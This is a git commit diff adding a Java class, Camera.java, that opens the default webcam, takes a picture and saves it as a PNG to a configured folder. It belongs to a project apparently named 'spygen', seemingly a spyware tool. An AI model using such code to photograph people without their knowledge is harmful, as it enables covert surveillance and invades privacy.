860d075b64108dc13d48abeeac1971f8202814c2
HouariZEGAI <houarizegai14@gmail.com>
2019-04-19 14:27:29 +0100

    Open camera & save capture (picture)

---
+++ src/com/houarizegai/spygen/webcam/Camera.java
@@ -0,0 +1,26 @@
+package com.houarizegai.spygen.webcam;
+
+import com.github.sarxos.webcam.Webcam;
+import com.houarizegai.spygen.global.Settings;
+
+import javax.imageio.ImageIO;
+import java.io.File;
+import java.io.IOException;
+
+public class Camera {
+
+    public static void takePicture(String name) {
+        Webcam webcam = Webcam.getDefault(); // Get default camera
+        if(webcam == null) // Can't find camera
+            return;
+
+        webcam.open(); // Open the camera
+        try { // save the picture captured
+            ImageIO.write(webcam.getImage(), "PNG", new File(Settings.WEBCAM_PATH + "\\" + name + ".png"));
+        } catch (IOException ioe) {
+            ioe.printStackTrace();
+        }
+        webcam.close(); // Close the camera
+
+    }
+}
